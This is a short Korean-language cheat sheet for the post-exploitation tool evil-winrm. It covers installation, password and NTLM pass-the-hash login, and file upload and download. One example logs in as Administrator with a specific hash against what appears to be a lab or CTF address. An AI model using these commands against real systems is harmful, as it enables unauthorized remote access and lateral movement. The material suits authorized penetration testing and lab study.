# evil-winrm 설치 및 실전 사용법

## 1. 설치

```bash
# 루비 먼저 설치 (필수)
sudo apt update
sudo apt install ruby

sudo gem install evil-winrm
```

- 필수: O
- 파라미터: 없음

## 2. 기본 사용법

```bash
evil-winrm -i <타겟_IP> -u <사용자명> -p <비밀번호>
```

- 필수: -i(타겟 IP), -u(사용자명), -p(비밀번호)
- 파라미터 타입: IP, 문자열

## 3. 해시 인증 (NTLM hash)

```bash
evil-winrm -i <타겟_IP> -u <사용자명> -H <NTLM_hash>
```

- 필수: -i(타겟 IP), -u(사용자명), -H(NTLM 해시)
- 파라미터 타입: IP, 문자열, 해시값

## 4. 파일 업로드/다운로드

- 업로드: `upload <로컬파일명>`
- 다운로드: `download <원격파일명>`
- 파라미터 타입: 파일(.txt, .exe 등)

## 5. 명령 실행 예시

```bash
evil-winrm -i 10.10.53.245 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

- 관리자 해시로 바로 로그인

## 6. 옵션 요약

| 옵션     | 필수/선택 | 설명          | 타입          |
| -------- | --------- | ------------- | ------------- |
| -i       | 필수      | 타겟 IP       | IP            |
| -u       | 필수      | 사용자명      | 문자열        |
| -p       | 선택      | 비밀번호      | 문자열        |
| -H       | 선택      | NTLM 해시     | 해시값        |
| upload   | 선택      | 파일 업로드   | 파일(.txt 등) |
| download | 선택      | 파일 다운로드 | 파일(.txt 등) |

## 7. 실전 팁

- 해시 인증 시 `-H` 옵션만 사용, 비밀번호 필요 없음.
- 파일 업/다운은 evil-winrm 쉘 내에서 직접 명령어 입력.
- 관리자 권한 획득 후 `whoami`, `hostname` 등으로 권한 확인.

---
